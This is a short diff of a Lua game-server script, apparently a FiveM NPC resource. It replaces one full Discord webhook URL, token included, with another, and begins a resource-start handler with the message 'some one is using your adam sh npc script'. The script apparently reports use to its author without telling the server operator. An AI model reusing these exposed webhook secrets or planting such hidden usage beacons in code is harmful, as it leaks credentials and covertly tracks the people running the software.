@@ -1,4 +1,4 @@
-local logs = "https://discordapp.com/api/webhooks/641309914660077577/Xz0hVS41DHqsEy5zz75VS0ccytQ5TS4xRpqca8mRGg3L9Z_A_dvrStb-c6p-5b4tsI7Y"
+local logs = "https://discordapp.com/api/webhooks/641315296098910218/cks3N9x6quqQvsF_lI0tZHE0YiOGBCkoXLrfygUwFXtj6AgZ-_IZY7DSdrKmPXaM0kw4"
 local connect = "some one is using your adam sh npc script"
 AddEventHandler("onServerResourceStart", function(resource)
     if GetCurrentResourceName() == resource then
